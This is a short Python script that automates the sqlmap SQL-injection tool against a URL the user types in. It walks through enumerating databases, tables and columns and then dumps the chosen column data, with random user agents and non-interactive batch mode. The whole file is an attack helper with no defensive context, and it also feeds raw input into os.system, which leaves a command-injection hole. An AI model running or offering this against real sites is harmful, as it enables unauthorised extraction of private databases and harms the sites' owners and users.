import os
	
url = input("enter url: ")
sqlmap1 = os.system('sqlmap --url {} --dbs --random-agent --batch'.format(url))
dbs = input ("enter dbs : ")
sqlmap2 = os.system('sqlmap --url {} -D {} --tables --random-agent --batch'.format(url,dbs))
tap1 = input("enter tab: ")
sqlmap3 = os.system('sqlmap --url {} -D {} -T {} --columns --random-agent --batch'.format(url,dbs,tap1))
colm =input("enter colm : ")
sqlmap4 = os.system('sqlmap --url {} -D {} -T {} -C {} --dump --random-agent --batch'.format(url,dbs,tap1,colm))
